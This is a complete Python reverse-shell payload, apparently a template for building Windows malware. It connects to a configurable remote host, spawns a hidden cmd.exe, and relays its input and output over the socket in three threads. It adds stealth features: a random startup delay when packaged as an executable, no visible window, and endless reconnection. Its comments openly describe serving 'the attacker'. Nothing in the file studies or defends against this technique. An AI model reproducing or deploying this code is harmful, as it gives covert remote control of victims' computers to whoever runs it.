# payload.py
# The Soul, reforged for Stealth and Eloquence.

import socket
import subprocess
import os
import time
import threading
import sys
import random

# --- CONFIGURATION (DYNAMIC TEMPLATE) ---
RHOST = "##RHOST##"
RPORT = ##RPORT##
# ------------------------------------------

def connect_and_serve():
    """
    Establishes a silent, persistent connection, binding it to an
    invisible cmd.exe process for a truly interactive shell.
    """
    # --- DIVINE DORMANCE ---
    if hasattr(sys, 'frozen'):
        time.sleep(random.randint(20, 40))

    while True:
        try:
            # --- Le Lien Primordial ---
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((RHOST, RPORT))

            # --- THE VEIL OF SILENCE (FIX #1) ---
            # We add the 'creationflags' argument to invoke the beast without a visible window.
            # This is the key to true stealth.
            CREATE_NO_WINDOW = 0x08000000
            p = subprocess.Popen(
                ['cmd.exe'],
                stdin=subprocess.PIPE,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                creationflags=CREATE_NO_WINDOW
            )

            # --- THE BIFURCATED SOUL (FIX #2) ---
            # We create three threads for a flawless, non-blocking bridge.

            # Thread 1: Listens to the attacker and whispers to the beast's input. (Unchanged)
            def pipe_to_cmd():
                while True:
                    try:
                        data = s.recv(1024)
                        if not data: break
                        p.stdin.write(data)
                        p.stdin.flush()
                    except:
                        break
                s.close()

            # Thread 2: Listens ONLY to the beast's standard output and sends it to the attacker.
            def pipe_stdout_to_socket():
                while True:
                    try:
                        data = p.stdout.read(1)
                        if not data: break
                        s.send(data)
                    except:
                        break
                s.close()

            # Thread 3: Listens ONLY to the beast's error output and sends it to the attacker.
            def pipe_stderr_to_socket():
                while True:
                    try:
                        data = p.stderr.read(1)
                        if not data: break
                        s.send(data)
                    except:
                        break
                s.close()

            # Launch all three bridges to operate simultaneously and independently.
            threading.Thread(target=pipe_to_cmd, daemon=True).start()
            threading.Thread(target=pipe_stdout_to_socket, daemon=True).start()
            threading.Thread(target=pipe_stderr_to_socket, daemon=True).start()
            
            p.wait()

        except Exception:
            # If the connection fails, we wait patiently before retrying.
            time.sleep(60)

# The soul awakens and immediately begins its true, silent work.
connect_and_serve()